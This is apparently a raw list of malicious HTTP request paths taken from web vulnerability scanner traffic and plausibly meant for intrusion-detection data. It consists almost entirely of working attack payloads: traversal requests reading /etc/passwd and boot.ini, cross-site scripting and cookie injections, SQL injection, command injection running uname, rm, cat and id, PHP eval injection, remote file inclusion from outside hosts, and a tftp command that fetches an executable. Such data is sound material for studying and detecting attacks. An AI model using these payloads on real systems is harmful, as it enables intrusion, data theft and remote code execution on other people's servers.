+/examples/jsp/jsp2/jspx/al_initialize.php?alpath=/etc/passwd\x00
+/d5a5renl.kspx?<script>cross_site_scripting.nasl</script>
+/y8pmygrp.htm?<script>cross_site_scripting.nasl</script>
+/javascript/pubs.exe
+/help.php?q="&rm\x09q57946156\x09#
+/en-us/hipkz026.php?<meta http-equiv=set-cookie content="testyrbs=2855">
+/scripts/1hactwocbsuo.cfm
+/main.php?logout=\x0auname\x09>q18697999\x09#
+/scripts/servubrowse.asp
+/javascript/submit.exe
+/help.php?q="ver\x09>q14739543&rem\x09
+/cgis/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
+/p043snfr.php3?<script>cross_site_scripting.nasl</script>
+/scripts/vzdybnanqpc3.php
+/i686v90l.cfc?<script>document.cookie="testfutf=1550;"</script>
+//../../../../../../../../etc/passwd\x00
+/cgis/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/hrttz9fj.fts?<script>document.cookie="testtbjy=7334;"</script>
+/cgi-bin/showproduct.php?product=1'
+/bb000001.pl<script>alert('vulnerable')</script>
+/examples/jsp/jsp2/jspx/config.php?returnpath=/etc/passwd\x00
+/i7prbs22.cgi?<script>document.cookie="testjnre=7328;"</script>
+/cacti/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd
+/examples/jsp/jsp2/jspx/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd
+/help.php?q='\x0auname\x09>q12762848\x09#
+/cacti/cal_week.php?op=week&catview=999'
+/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini
+messagedetail.asp?msg_id='
+/um7xpn15.mscgi?<script>document.cookie="testotoy=6142;"</script>
+/main.php?logout="|ping -w 9000 -n 1 4.3.2.1|rem 
+/scripts/zq9frlz6fcfp.php
+/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd
+/0z575z74.htm?<script>document.cookie="testuhsv=9753;"</script>
+/recordings/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|
+/cgi-bin/guestbook/passwd
+/8x6w469u.kspx?<script>document.cookie="testgfjr=1286;"</script>
+/kerkhoffs'_law/
+/javascript/document.msg
+/i686v90l.kspx?<meta http-equiv=set-cookie content="testfutf=1550">
+/javascript/replicated.exe
+/3j8echh0.html?<meta http-equiv=set-cookie content="testfuqi=4189">
+/examples/servlets/servlet/rss.php?blogid=1&profile=../../config/config.properties.php\x00
+/scripts/zq9frlz6fcfp.cfm
+/cacti/calendar.php?serverpath=/etc/passwd\x00
+/cgibin/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go
+/main.php?stuff="ver\xa0>q63696925&rem\xa0
+/phpnuke/html/.php?name=network_tools&file=index&func=ping_host&hinput=;id
+/recordings/shoutbox.php?conf=../
+/demos/demo.browse.php?filename=/etc/passwd
+/<script>document.cookie="testvowq=604;"</script>
+/fpnpp5zg.pl?<meta http-equiv=set-cookie content="testyias=101">
+/scripts/weigh_keywords.php?etcdir=http://cirt.net/rfiinc.txt?
+/j4rdyhw8.php?<script>document.cookie="testrluj=1420;"</script>
+/help.php?q=";uname >q49727674 #
+/main.php?logout=/'
+/main.php<?eval($_post['q54461335']);?eval($_post['q54461335']);?>
+/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 412834017--
+/s7qus4g3.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/script_saved/
+/comments.php?scriptpath=http://192.168.202.96:8080/frznctvhi0i5??
+/index.php?page=../../../../../../../../../../../../../../../../../winnt/system32/ipconfig.exe
+/m2fpztty.pl?<script>cross_site_scripting.nasl</script>
+/phpmyadmin/index.php?string='
+/tuwjta1w.htm?<script>document.cookie="testpokn=7494;"</script>
+/cleartrust/ct_logon.asp?ctauthmode=basic&ctloginerrormsg=xx&ct_orig_uri=\">< script>alert(1)/script><\"
+/cgi-915/ppdscgi.exe
+/main.php?logout="ping;-w;10000;-n;1;4.3.2.1&rem;
+/javascript/nude.exe
+/y8pmygrp.do?<script>cross_site_scripting.nasl</script>
+/scripts/counter.exe
+/vac1l5vm.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/ybz5rz7a.php?<script>document.cookie="testsbvw=6289;"</script>
+/examples/jsp/jsp2/jspx/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
+/javascript/htpasswd.rhtml
+/ju0u7kfo.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/misc/audio.php?recording=../version.inc
+/grid_subscriptions2/
+/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=lnu3g9zkqrlule9mw
+/examples/jsp/colors/hw3.cgi?daysonly=0).system('id').(
+/eei78ore.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+../../../../../../../../../../../../etc/passwd
+/<meta http-equiv=set-cookie content="testsixi=8451">
+/javascript/hp.exe
+/qhvu0pdg.php?<script>document.cookie="testchuc=2100;"</script>
+/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=
+/main.php?logout=';uname >q89385457 #
+/scripts/ggvfa_wichxq.asp
+/eei78ore.php?<script>cross_site_scripting.nasl</script>
+/javascript/.passwd.dll
+/src/scripture.php?pageheaderfile=@rfiurl?pageheaderfile=@rfiurl?
+/securecgi-bin/csusercgi.exe?help+00.abcd.e.fghijk"""><script>alert("""xss""")</script>
+/index.php?config["sipssys"]=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/javascript/pc.exe
+http://xxxxxxxxxxx.:80/<script>alert('vulnerable')</script>.cfm
+<meta http-equiv=set-cookie content="testjvvf=7721">
+/cgi-perl/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
+/nsn/..\util/ren.bas
+/examples/servlets/servlet/faxsurvey?cat /etc/passwd
+/zabbix/frontends/php/locales.php?download=1&langto=1&extlang[".system('/./tmp/fetpkvinrp.sh+>+/dev/null+&')."]=1
+/en-us/jnv890lt.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/save.php?file_save=/etc/passwd
+/phpmyadmin/notify?from=nessus"|id"
+/examples/jsp/error/index.php?op=default&date=200607' union select 1,1200541698,1,1,1,1,1,1,1,1--&blogid=1
+/help.php?q="ping;-w;11000;-n;1;4.3.2.1&rem;
+/scripts/zdbyw3dn3gh2.html
+/q703m78q.kspx?<script>document.cookie="testvowq=604;"</script>
+/main.php?stuff="&ver;>q22147997&rem;
+/help.php?q="|ping\xa0-w\xa09000\xa0-n\xa01\xa04.3.2.1|rem\xa0
+/script/tick/allincludefortick.php?path_to_code=http://192.168.202.118:8080/zz5thkvtmlgl?
+/v3axg1p8.cfm?<meta http-equiv=set-cookie content="testxagh=6987">
+/p043snfr.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/main.php?logout="|ping;-w;11000;-n;1;1.2.3.4|rem;
+/javascript/stored.exe
+/launch.asp?nfuse_application=<script>alert('vulnerable')</script>
+/cacti/dsweb/services/user-1"><body onload=alert('xerox_docushare_dsweb_xss.nasl')>
+/p043snfr.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/xfkun1ku.htm?<script>cross_site_scripting.nasl</script>
+/ghswfouu.cfm?<script>document.cookie="testsqmm=5713;"</script>
+/top.php?stuff="rm\x09q12423295&rem\x09
+/main.php?stuff=&uname >q17531529 #
+/h5sc3gxy.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/reference.exe
+/interface/login/login_frame.php?site="><!--#exec cmd="dir \"--><
+/scripts/vzdybnanqpc3.asp
+/main.php?stuff="&sleep\x099\x09#
+/en-us/oie504mr.php3?<script>document.cookie="testtpby=7052;"</script>
+/scripts/k0pxpjgnimox.cfm
+/de3v2dd9.aspx?<script>cross_site_scripting.nasl</script>
+<meta http-equiv=set-cookie content="testabrn=6368">
+/x7pclv4s.kspx?<meta http-equiv=set-cookie content="testiulz=3709">
+/scripts/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
+/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331918976&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
+/fnwhrxyd.htm?<script>cross_site_scripting.nasl</script>
+/examples/jsp/sessions/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script
+/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>
+/examples/servlets/servlet/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl
+/bxnyrhmh.aspx?<meta http-equiv=set-cookie content="testmjct=1867">
+/scripts/misc/info.php
+/ybz5rz7a.html?<script>document.cookie="testsbvw=6289;"</script>
+<script>document.cookie="testbnli=1975;"</script>
+/help.php?q="&ping\x09-w\x098000\x09-n\x091\x094.3.2.1&rem\x09
+/<meta http-equiv=set-cookie content="testxagh=6987">
+/main.php?stuff="rm q23955852 #
+/scripts/ubbthreads.php
+/azcrfs8d.jspa?<meta http-equiv=set-cookie content="testjpdr=9205">
+/examples/servlets/servlet/?"><script>alert('struts_sa_surl_xss.nasl')</script>
+/b5xdqgz2.cgi?<script>cross_site_scripting.nasl</script>
+/169okeyj.mscgi?<script>document.cookie="testxeoi=3573;"</script>
+/scripts/axdgpyi2bn6f.php
+/scripts/msmmask.exe?mask=/nessus312940811.asp
+/recordings/admin.php?style=../../../../../../../../../../../../etc/passwd\x00
+/examples/jsp/checkbox/index.php?templates_dir=/etc/passwd\x00
+/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332010394')</script>
+/javascript/message.exe
+/scripts/d3z7yywpyeoa.pl
+/top.php?stuff="&ver&rem 
+/examples/servlets/servlet/resetpw.php?email=../../../../../../../../../../../../etc/passwd
+/javascript/solved.exe
+/index.php?action=search&searchfor=\"><script>alert('vulnerable')</script >
+/main.php?stuff="&ver;>q86839174&rem;
+/oie504mr.nsf?<script>document.cookie="testtpby=7052;"</script>
+/nyvbv05h.cgi?<script>document.cookie="testftxz=5980;"</script>
+/javascript/dbmodules.exe
+/mail.php?id='/**/union/**/select/**/1,2,1331919224,4--&blog=1
+/examples/jsp/cal/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
+/fpnpp5zg.asp?<script>document.cookie="testyias=101;"</script>
+ftp://192.168.28.202/*<apache_mod_proxy_ftp_glob_xss.nasl>
+/raanw4ia.mscgi?<script>cross_site_scripting.nasl</script>
+/cgibin/fileseek2.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
+/scripts/k0pxpjgnimox.shtml
+/h5i6crm3.mscgi?<meta http-equiv=set-cookie content="testlihk=7070">
+/hipkz026.php?<script>document.cookie="testyrbs=2855;"</script>
+/6n7aacgg.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/num/demos/demo.browse.php?filename=/etc/passwd
+/jnt3f86c.htm?<meta http-equiv=set-cookie content="testcmax=9270">
+/help.php?q=uname\x09>q77267797\x09#
+/bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
+/javascript/ppt.exe
+/dda2qr7j.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/j2kdmfw4.cfc?<script>cross_site_scripting.nasl</script>
+/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
+/examples/jsp/jsp2/jspx/index.php?user_langue=../../../../../../../../../../etc/passwd
+/0rufe52p.php3?<script>cross_site_scripting.nasl</script>
+/static//..\..\..\..\..\..\..\..\etc/passwd
+/cgi-915/a1stats/a1disp3.cgi?../../../../../../../etc/passwd
+/main.php?stuff="ping,-w,9000,-n,1,4.3.2.1&rem,
+/_vti_bin/shtml.exe
+/help.php?q="rm\x0cq43711515&rem\x0c
+/main.php?stuff=";rm\x09q18442351\x09#
+/cgi-bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/main.php?stuff="ping -w 10000 -n 1 4.3.2.1&rem 
+/nuh3zirz.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/bin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
+/o6ebbirj.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/viewcvs.cgi/?cvsroot=<script>foo</script>
+/javascript/~log.exe
+/cgi-bin/index.php?op=default&date=200607' union select 1,1192121872,1,1,1,1,1,1,1,1--&blogid=1
+/cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--
+/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?
+/phpmyadmin/documentation.html?'"=1
+/index.php?cid='
+/cacti/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00
+/examples/jsp/sessions/sawmill6cl.exe?ho+{complete_version}
+/apavxugx.jsp?<script>document.cookie="testdnbh=5237;"</script>
+/javascript/pool.exe
+/examples/jsp/num/index.php?_language=../../../../../../../../../../etc/passwd\x00
+/aj3pf49c.cfm?<script>document.cookie="testnofv=4170;"</script>
+/main.php?logout="&ping,-w,11000,-n,1,4.3.2.1&rem,
+/imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql+--&pass=x
+/scripts/weigh_keywords.php?etcdir=http://192.168.202.96:8080/4dckqcc0acprbz?
+/9ko6m4c8.php3?<meta http-equiv=set-cookie content="testylik=3403">
+/scripts/index.php?id='union/**/select/**/0,0,521532225,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/top.php?stuff="&del q85387982 #
+/javascript/.passwd.csproj
+/javascript/catalogs.exe
+/jdx255ea.cfc?<meta http-equiv=set-cookie content="testziyq=5055">
+/recordings/phf?qalias=x\x0a/bin/cat /etc/passwd
+/examples/jsp/num/popup.php?include_path=/etc/passwd\x00
+/top.php?stuff="\x0asleep\x097\x09#
+/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
+/en-us/9kr0ih0v.asp?<script>document.cookie="testzgnm=1183;"</script>
+/javascript/running.exe
+/cgi-bin/home/search.asp?nchannel='1
+/main.php?logout="del q21367835&rem 
+/cgi-bin/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/rv98iwjp.htm?<script>cross_site_scripting.nasl</script>
+/cgi-bin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
+/phpmyadmin/documentation.html?phpmyadmin=/etc/passwd
+/examples/jsp/error/calendar_admin.pl?config=|cat /etc/passwd|
+/scripts/ck8pj.exe?/x+/c+tftp -i 192.168.202.118 get durjhxa1 qowmcdks.exe
+/phpmyadmin/documentation.html?phpmyadmin=|cat /etc/passwd|
+/main.php?logout='del\x09q76232693\x09#
+/examples/jsp/num/install.php?newlang=../../cpg_error.log\x00
+/javascript/closing.exe
+/javascript/monitoring.exe
+/en-us/fo564rei.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/prescription010507/
+/if69ddo1.nsf?<meta http-equiv=set-cookie content="testiabz=5220">
+/javascript/roaming.exe
+/6qbynt4f.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/jnv890lt.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/6qbynt4f.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/3hlysl2x.pl?<meta http-equiv=set-cookie content="testgjbe=8505">
+/main.php?logout="ping;-w;11000;-n;1;4.3.2.1&rem;
+/examples/jsp/cal/calendar_admin.pl?config=|cat /etc/passwd|
+/cgi-bin/search.jsp?q=%"<script>alert(1332008604)</script>
+/rtph263dumpscript/
+/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=10nbpndw5e2ir1ncx
+/cgi-bin/mlog.html?screen=/etc/passwd
+/main.php?stuff="&ping\x09-w\x098000\x09-n\x091\x091.2.3.4&rem\x09
+/examples/jsp/jsp2/jspx/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00
+/zroo33l4.php?<meta http-equiv=set-cookie content="testiklc=904">
+/top.php?stuff='\x0asleep\x097\x09#
+/scs86g1p.cfc?<script>document.cookie="testquyx=2820;"</script>
+/d5a5renl.html?<script>cross_site_scripting.nasl</script>
+/scripts/mapserv?map=mapserver_detect.nasl.map
+/javascript/corporate.exe
+/phpmyadmin/index.php?chemin=../../../../../../..//etc
+/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>
+/ju0u7kfo.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/shoutbox/expanded.php?conf=../../../../../../../etc/passwd 
+/help.php?q="rm\x09q12928131\x09#
+/en-us/account/more.php?id=1'
+/examples/servlets/servlet/forum_2.php?msg=10&return=<script>foo</script>
+/m2fpztty.idc?<script>cross_site_scripting.nasl</script>
+/l13b77e5.htm?<script>document.cookie="testjvvf=7721;"</script>
+/javascript/.passwd.stackdump
+/examples/jsp/num/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x
+/javascript/code.exe
+/manager/activatemember?activatecode=&member="><script>alert('mvnforum_activatemember_xss.nasl')</script>
+/o1zj4u9v.asp?<meta http-equiv=set-cookie content="testabrn=6368">
+/help.php?q='\x0auname #
+/javascript/hit.exe
+/main.php?stuff="ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09
+/subscriptions.doc
+/include/scripts/run_auto_suspend.cron.php?dir=@rfiurl
+/nyjgaorz.kspx?<script>cross_site_scripting.nasl</script>
+<meta http-equiv=set-cookie content="testrluj=1420">
+/bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>
+/jnt3f86c.dll?<meta http-equiv=set-cookie content="testcmax=9270">
+/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331919142&lang_crm=../../vtigerservice.php\x00
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo";ls+-l;rm+/tmp/ukirnkmpbn"
+/script_path/installation/index.php?mosconfig_absolute_path=http://192.168.202.96:8080/4dckqcc0acprbz??
+/cgi-914/powerup/r.cgi?file=../../../../../../../../../../etc/passwd
+/main.php?stuff=&ver,>q61913742&rem,
+/3j8echh0.php?<meta http-equiv=set-cookie content="testfuqi=4189">
+/subscriptions.config
+/tlhhwkvs.exe/
+/javascript/auth.exe
+/awstats/awstats.pl?migrate=|echo;chmod 555 /tmp/urcppbumwm0;echo|awstats379091.txt
+/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.96:8080/4dckqcc0acprbz?\x00
+/help.php?q=uname >q18373347 #
+/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//
+/speech-transcript/
+/zv8tv7h8.do?<script>document.cookie="testcqwz=9752;"</script>
+/t7tm4m0b.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/index.php?op=default&date=200607' union select 1,1128524552,1,1,1,1,1,1,1,1--&blogid=1
+/help.php?q='\x0adel\x09q47355772\x09#
+/examples/jsp/sessions/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>
+/m2fpztty.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/sawmillcl.exe?ho+{complete_version}
+/sscript/
+/cgi-bin/webplus?script=/../../../../etc/passwd
+/subscriptions.part
+/g8nu2yy7.jspa?<script>cross_site_scripting.nasl</script>
+/top.php?stuff=';rm q26271527 #
+/scripts/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
+/7dbjwpw6.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgibin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
+/top.php?stuff="ping -w 7000 -n 1 1.2.3.4&rem 
+/cgi-bin/index.php?p='nessus
+/main.php?stuff="sleep 11 #
+/en-us/odzk29aa.nsf?<script>document.cookie="testtfvh=2141;"</script>
+/scripts/prnnucptkixl.php
+/ju0u7kfo.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/ydexw8by.x?<meta http-equiv=set-cookie content="testulex=4996">
+/main.php?logout="&uname >q45435148 #
+/cgi-win/ion-p?page=../../../../../etc/passwd
+/cgibin/gw5/gwweb.exe?help=bad-request
+/j4rdyhw8.fts?<script>document.cookie="testrluj=1420;"</script>
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/djjeroppey.sh'); function v
+/scripts/ylrvly9nh_pf.inc
+/scripts/index.php?op=default&date=200607' union select 1,1100287420,1,1,1,1,1,1,1,1--&blogid=1
+/scripts/vhost.php?action=logout&time=1331908735
+/scripts/kfzqb5x87lvq.pl
+/newsletter_log.php?logfile=info.php&logtime=000060&email=<?php echo md5("test"); ?>
+/ao22ww7y.do?<script>document.cookie="testqppc=8767;"</script>
+/javascript/globals.exe
+/b5xdqgz2.exe?<script>cross_site_scripting.nasl</script>
+/jw64yq8u.x?<meta http-equiv=set-cookie content="testylfu=1313">
+/scripts/gitweb.pl
+/main.php?logout='&del q16695623 #
+/scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919202
+/uvazfs7p.pl?<meta http-equiv=set-cookie content="testwtbo=4831">
+/cgi-bin/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+/examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0,157871866,0,0,0,0,0--
+/top.php?stuff='\x0auname\x09>q23871271\x09#
+/manager/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+/javascript/subscription.exe
+/ju0u7kfo.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/admin/addentry.php?phpbb_root_path=/etc/passwd\x00
+/recordings/index.php?chemin=../../../../../../..//etc
+/en-us/account/home/search.asp?nchannel='1
+/javascript/_vti_cnf.exe
+/0qhcnefz.aspx?<script>cross_site_scripting.nasl</script>
+/ssxmagazinesubscription/
+/en-us/<img src="javascript:alert(cross_site_scripting.nasl);">.dll
+/examples/servlets/servlet/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435
+/examples/jsp/checkbox/newsscript.pl?mode=admin
+/en-us/ddoworrl.asp?<script>document.cookie="testvlau=8517;"</script>
+/javascript/resolution.exe
+/examples/jsp/jsp2/jspx/include/sql.php?include_path=/etc/passwd\x00
+/scripts/vzdybnanqpc3.inc
+/\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini
+/fcgi-bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
+/cgis/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
+/javascript/programs.exe
+/help.php?q=&uname\x09>q82939622\x09#
+/t3af3tdz.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/index.php?board=nonexistant1419816536
+/b5xdqgz2.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/bn857frh.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/s7qus4g3.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scgi-bin/.htpasswd
+/phpmyadmin/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00
+/en-us/account/a1stats/a1disp3.cgi?/../../../../../../etc/passwd
+/recordings/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||
+/dslpwt15.do?<script>document.cookie="testtkio=5454;"</script>
+/mom's ass/
+/javascript/1994.exe
+/scripts/qg9h0c0svvat.sh
+/606wkcop.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/en-us/s7qus4g3.cfm?<script>cross_site_scripting.nasl</script>
+/vhzmaia2.cfm?<meta http-equiv=set-cookie content="testkogj=3979">
+/javascript/htpasswd.pl
+/main.php?stuff="&ping,-w,11000,-n,1,1.2.3.4&rem,
+/i2n4v4rl.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>
+/scripts/search.scr.php?globals[pth][classes]=http://cirt.net/rfiinc.txt??
+/en-us/account/index.php?act=arcade&do=stats&gameid=1'
+/g8nu2yy7.kspx?<script>cross_site_scripting.nasl</script>
+/javascript/document.sfish
+/help.php?q="ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1&rem\xa0
+/7dbjwpw6.nsf?<script>cross_site_scripting.nasl</script>
+/ny1b3qq4.x?<script>cross_site_scripting.nasl</script>
+/faq.php?action=&type=view&s=&id=-1' union select 0,1323875856,0,0,0,0,0--
+/scs86g1p.cfc?<meta http-equiv=set-cookie content="testquyx=2820">
+/cgi-home/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
+/oncixdescription/
+/en-us/oie504mr.x?<script>document.cookie="testtpby=7052;"</script>
+/main.php?logout=&ping;-w;7000;-n;1;4.3.2.1&rem;
+/search.jsp?q=%"<script>alert(1331905049)</script>
+/scripts/man-cgi?section=0&topic=ls;id
+/xsskj3/
+/main.php?stuff='\x0auname\x09>q47233887\x09#
+/examples/jsp/jsp2/el/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd
+/1r8cfrlf.kspx?<meta http-equiv=set-cookie content="testydan=5106">
+/scripts/mensajeitor.php
+/passwdage/
+/en-us/splunk_413_404error_xss.nasl-1331904921
+/bl8sefdm.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/banners.php?op=emailstats&cid=1 and passwd like 'a%'/*
+/script/
+/scripts/breakcal/calendar.cgi
+/javascript/pipermail.exe
+/examples/jsp/checkbox/index.php?id='union/**/select/**/0,0,1364632458,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/bmeun223.cfm?<script>document.cookie="testhhwu=7044;"</script>
+/t3af3tdz.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/yef5f3d5.jsp?<meta http-equiv=set-cookie content="testcrcv=6167">
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=q72116194&frm_user=&scr_height=&scr_width=
+/scripts/rot13sj.cgi?/etc/passwd
+/examples/jsp/jsp2/jspx/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
+/main.php?stuff=";rm q85142671 #
+/ywaxntrx.jspa?<script>cross_site_scripting.nasl</script>
+/help.php?q="ver\xa0>q74458178&rem\xa0
+/<meta http-equiv=set-cookie content="testggad=2000">
+/eg2u8pbv.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/k0pxpjgnimox.php
+/phpmyadmin/way-board/way-board.cgi?db=/etc/passwd\x00
+/cacti/gadgets/blog/blogmodel.php?path=/etc/passwd\x00
+/en-us/n9xlumt5.html?<script>cross_site_scripting.nasl</script>
+/manager/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
+/phpmyadminsearch_results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/edit.jsp?page=user&editor=../../../install
+/bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd
+/examples/jsp/sessions/supporter/tupdate.php?groupid=change&sg='
+/bemarket/postscript/postscript.php?p_mode=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/scriptpath/footers.php?tinybb_footers=http://192.168.202.118:8080/zz5thkvtmlgl?
+/manager/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
+/grey's anatomy 3x09 repack hdtv/
+/en-us/i686v90l.do?<meta http-equiv=set-cookie content="testfutf=1550">
+/phpmyadmin/scripts/setup.php
+/<script>document.cookie="testylfu=1313;"</script>
+/7dbjwpw6.idc?<script>cross_site_scripting.nasl</script>
+/addvip.php?msetstr["progsdir"]=http://192.168.202.96:8080/swgnhpydbq0t?
+/esmozg5d.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/property.exe
+/prescription-xanax/
+/if69ddo1.php?<script>document.cookie="testiabz=5220;"</script>
+/scripts/troops.cgi
+/javascript/win32.exe
+/javascript/compliance.exe
+/scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,403538393,1441170175,1,1,1,1,1--&blogid=1
+/phpmyadmin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>
+/examples/jsp/sessions/index.php?template=../../../loudblog/custom/config.php\x00
+/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908691&lang_crm=../../vtigerservice.php\x00
+/main.php?stuff="&del\x0cq27346825&rem\x0c
+/9o6g5vkn.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/'stoked' gets to the heart of extreme athletics/
+/0u75ldxq.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/jspx/config.php?path[docroot]=/etc/passwd\x00
+/fmnveedu.idc?<meta http-equiv=set-cookie content="testgfbr=7014">
+/help.php?q="&ping\x0c-w\x0c9000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c
+/javascript/pii.exe
+/javascript/ubb.exe
+/j4drbkil.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/jspx/index.php?show=/etc/passwd
+/1qwv2p5p.x?<script>document.cookie="testvqcy=252;"</script>
+/scriptpath/footers.php?tinybb_footers=http://192.168.202.96:8080/ipb5ri?
+/main.php?stuff="&rm q23549573 #
+/script pack/
